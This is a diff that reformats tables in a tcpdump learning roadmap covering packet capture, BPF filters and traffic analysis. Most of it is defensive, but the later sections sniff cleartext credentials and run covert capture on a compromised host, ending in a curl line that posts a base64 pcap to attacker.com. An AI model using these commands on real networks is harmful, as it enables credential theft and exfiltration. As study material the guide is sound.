@@ -21,17 +21,17 @@
 > [[Cyber-Security/Roadmap/README|🏠 Master Roadmap]] · [[Cyber-Security/Roadmap/Tools/README|🔧 Tools Index]]
 
 | Packet Capture & Analysis | Traffic Crafting & Flooding | MitM & Interception | Network Discovery |
-|:--------------------------|:----------------------------|:--------------------|:------------------|
+| :-------------------------- | :---------------------------- | :-------------------- | :------------------ |
 | [[Wireshark\|🦈 Wireshark]] | [[Scapy\|📦 Scapy]] | [[Bettercap\|🕵️ Bettercap]] | [[Nmap\|🗺️ Nmap]] |
 | **📻 tcpdump** (you are here) | [[hping3\|🔨 hping3]] | [[Ettercap\|🐛 Ettercap]] | [[Netcat\|🔌 Netcat]] |
-| [[iperf3\|📶 iperf3]] | | [[Responder\|📡 Responder]] | [[OpenSSL\|🔒 OpenSSL]] |
+| [[iperf3\|📶 iperf3]] || [[Responder\|📡 Responder]] | [[OpenSSL\|🔒 OpenSSL]] |
 
 ---
 
 ## 📊 Progress Overview
 
 | Phase | Focus | Tasks | Est. Time |
-|:---:|:---|:---:|:---:|
+| :---: | :--- | :---: | :---: |
 | 1 | Fundamentals | 5 | 2–3 hours |
 | 2 | BPF Filters | 5 | 3–4 hours |
 | 3 | Capture Options | 4 | 2–3 hours |
@@ -40,7 +40,7 @@
 | 6 | Integration | 3 | 1–2 hours |
 | 7 | Practical Labs | 4 | 3–5 hours |
 | 8 | Mastery Challenges | 3 | 2–4 hours |
-| | **Total** | **32** | **~17–27 hours** |
+|| **Total** | **32** | **~17–27 hours** |
 
 ---
 
@@ -53,7 +53,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Layer 2+** | Captures Ethernet frames, IP packets, TCP/UDP/ICMP segments — the complete packet. |
 | **Promiscuous Mode** | By default, captures only traffic to/from the host. `-p` disables promiscuous mode. Without `-p`: captures all traffic on the segment (if the NIC/driver supports it). |
 | **Interface** | Must specify with `-i`. `-i any` — capture on all interfaces simultaneously. |
@@ -66,7 +66,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 5 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Linux** | `apt install tcpdump`. Pre-installed on most distributions. |
 | **macOS** | Built-in. |
 | **Verify** | `tcpdump --version`. |
@@ -78,7 +78,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **All traffic** | `sudo tcpdump -i eth0`. Ctrl+C to stop. |
 | **Count** | `-c 100` — capture 100 packets then stop. |
 | **Verbose** | `-v` — verbose (TTL, id, length). `-vv` — more verbose. `-vvv` — maximum verbosity. |
@@ -91,7 +91,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Interface** | `-i eth0`. `-i any` — all interfaces. |
 | **Write to file** | `-w capture.pcap` — save raw packets for Wireshark. |
 | **Read from file** | `-r capture.pcap` — analyze saved capture. |
@@ -106,7 +106,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Default** | `HH:MM:SS.usec SRC > DST: proto, flags, seq, ack, win, length`. |
 | **Example TCP** | `10:15:23.123456 IP 192.168.1.5.54321 > 93.184.216.34.80: Flags [S], seq 123456789, win 64240, length 0`. |
 | **Flags** | `[S]`=SYN, `[.]`=ACK, `[SA]`=SYN-ACK, `[P.]`=PSH-ACK, `[F.]`=FIN-ACK, `[R.]`=RST-ACK. |
@@ -122,7 +122,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Single Host** | `tcpdump -i eth0 host 192.168.1.100` — traffic to or from this IP. |
 | **Source** | `tcpdump -i eth0 src host 192.168.1.100` — only FROM this IP. |
 | **Destination** | `tcpdump -i eth0 dst host 192.168.1.100` — only TO this IP. |
@@ -135,7 +135,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Single Port** | `tcpdump -i eth0 port 80` — HTTP traffic. |
 | **Port Range** | `tcpdump -i eth0 portrange 1-1024`. |
 | **Src/Dst Port** | `tcpdump -i eth0 src port 80` — responses FROM port 80. `tcpdump -i eth0 dst port 443` — requests TO port 443. |
@@ -148,7 +148,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **TCP** | `tcpdump -i eth0 tcp`. |
 | **UDP** | `tcpdump -i eth0 udp`. |
 | **ICMP** | `tcpdump -i eth0 icmp` — ping traffic. |
@@ -162,7 +162,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **AND** | `tcpdump -i eth0 host 192.168.1.5 and port 443`. |
 | **OR** | `tcpdump -i eth0 port 80 or port 443`. |
 | **NOT** | `tcpdump -i eth0 not port 22` — exclude SSH (reduces noise when connected via SSH). |
@@ -175,7 +175,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **SYN packets** | `tcpdump -i eth0 "tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0"` — SYN without ACK (new connections only). |
 | **RST packets** | `tcpdump -i eth0 "tcp[tcpflags] & tcp-rst != 0"` — connection resets. |
 | **SYN flood detection** | High rate of SYN packets. `tcpdump -i eth0 'tcp[tcpflags] == tcp-syn'` — shows only pure SYN packets. |
@@ -191,7 +191,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Capture** | `sudo tcpdump -i eth0 -w /tmp/capture.pcap -s 0`. |
 | **Analyze** | `tcpdump -r capture.pcap -nn -v`. Apply the same BPF filters when reading: `tcpdump -r capture.pcap port 80`. |
 | **Open in Wireshark** | Transfer `.pcap` file to a desktop machine → open with Wireshark for full GUI analysis. |
@@ -203,7 +203,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **By Size** | `-C 100` — rotate to a new file every 100MB. Files named: `capture.pcap0`, `capture.pcap1`, etc. |
 | **By Time** | `-G 3600` — rotate every 3600 seconds (1 hour). Use with `-w capture_%Y%m%d%H%M%S.pcap` (strftime format). |
 | **Keep N files** | `-W 10` — keep only 10 files (ring buffer). Oldest deleted as new is created. |
@@ -216,7 +216,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Drop Count** | tcpdump shows dropped packet count at exit: `X packets received, Y dropped`. Drops = kernel buffer full. |
 | **Increase Buffer** | `-B 4096` — set kernel buffer to 4096KB. Useful for high-traffic captures. |
 
@@ -227,7 +227,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Hex+ASCII** | `tcpdump -i eth0 -X port 80` — shows hex and ASCII side by side. Good for seeing unencrypted HTTP content. |
 | **ASCII only** | `tcpdump -i eth0 -A port 80` — shows ASCII only. Easier to read for HTTP. |
 | **Credentials** | On an HTTP or Telnet connection: `-A` shows credentials in cleartext (login forms, basic auth, etc.). |
@@ -243,7 +243,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **HTTP** | `tcpdump -i eth0 -A port 80 | grep -i "GET\|POST\|Host:\|password"`. Extract URLs, host headers, form data. |
 | **DNS** | `tcpdump -i eth0 udp port 53 -nn -vv`. See query names and responses. Find suspicious DNS lookups (exfiltration, C2 beaconing). |
 | **FTP** | `tcpdump -i eth0 -A port 21`. Capture FTP credentials (cleartext). |
@@ -256,7 +256,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **New Connections** | `tcpdump -i eth0 'tcp[tcpflags] == tcp-syn' -nn` — see every new TCP connection attempt. |
 | **Failed Connections** | `tcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0' -nn` — see RST packets (connection refused or terminated). |
 | **Count Connections** | `tcpdump -i eth0 'tcp[tcpflags] == tcp-syn' -nn | awk '{print $5}' | cut -d. -f1-4 | sort | uniq -c | sort -rn | head`. Top source IPs by new connection rate. |
@@ -268,7 +268,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **tcpflow** | `tcpflow -r capture.pcap -C -g` — reconstruct TCP streams from pcap. |
 | **Wireshark** | Open pcap → Follow TCP/HTTP stream → Export HTTP objects (File → Export Objects → HTTP). |
 | **networkminer** | GUI tool on Windows for file extraction from pcap. |
@@ -281,7 +281,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **ARP Spoofing** | `tcpdump -i eth0 arp` — look for one MAC address claiming multiple IPs, or IP address changing MAC. `arp -a` before/after for comparison. |
 | **Port Scan** | Many SYN packets from one source to many different ports in quick succession. |
 | **Data Exfiltration** | Unusually high outbound traffic volume. Large DNS query payloads (DNS tunneling). ICMP packets with large payloads. |
@@ -298,7 +298,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **HTTP Basic Auth** | `tcpdump -i eth0 -A port 80 | grep -i "Authorization: Basic"`. Decode base64: `echo "dXNlcjpwYXNz" | base64 -d`. |
 | **FTP** | `tcpdump -i eth0 -A port 21 | grep -i "user\|pass"`. |
 | **Telnet** | `tcpdump -i eth0 -A port 23` — every keystroke visible. |
@@ -311,7 +311,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Beaconing** | `tcpdump -i eth0 -w beacon.pcap dst host suspicious_ip` → analyze in Wireshark. Look for regular interval connections. |
 | **DNS C2** | `tcpdump -i eth0 udp port 53 -nn -A` — long DNS query strings, unusual record types (TXT, NULL), high query frequency to a single domain. |
 | **HTTP C2** | `tcpdump -i eth0 -A port 80 | grep "User-Agent\|Host:"` — unusual User-Agents, beaconing to uncommon domains. |
@@ -323,7 +323,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Capture Credentials** | On a compromised host: `tcpdump -i any -A port 80 or port 21 or port 110 -w /tmp/creds.pcap`. Capture traffic from other clients on the network segment. |
 | **Exfiltrate PCAP** | Transfer pcap from compromised host to attack machine for offline analysis. `scp`, `nc`, base64+paste. |
 
@@ -334,7 +334,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Capture "normal" traffic to understand what baseline looks like. Anomalies stand out against a known baseline. |
 | **Method** | Capture 30 min of normal traffic. Note: top talkers, common ports, common protocols, average packet sizes. Compare against future captures for deviation. |
 
@@ -349,7 +349,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Workflow** | Capture on remote server: `sudo tcpdump -i eth0 -s 0 -w /tmp/capture.pcap`. SCP to local: `scp user@server:/tmp/capture.pcap .`. Open in Wireshark. |
 | **Live Pipe** | `ssh user@server "sudo tcpdump -i eth0 -s 0 -w -" | wireshark -k -i -` — live remote capture in local Wireshark. |
 
@@ -360,7 +360,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **tshark** | CLI version of Wireshark. Much more powerful analysis than tcpdump for reading pcap. `tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri`. |
 | **Protocol Statistics** | `tshark -r capture.pcap -qz io,phs` — protocol hierarchy statistics. |
 
@@ -371,7 +371,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Deploy** | After compromising a Linux host: check if tcpdump is installed (`which tcpdump`). If root: run directly. If not installed: upload static binary. |
 | **Capture** | `tcpdump -i any -s 0 -w /tmp/.hidden/capture.pcap` (hidden directory). |
 | **Transfer** | `base64 /tmp/capture.pcap | curl -X POST http://attacker.com/ -d @-` or SCP. |
@@ -452,7 +452,7 @@
 # 📋 FINAL COMPETENCY MATRIX
 
 | Competency | Self-Assessment |
-|:---|:---:|
+| :--- | :---: |
 | Can capture live traffic on a specified interface | ☐ |
 | Can write and read PCAP files | ☐ |
 | Can write complex BPF filter expressions | ☐ |
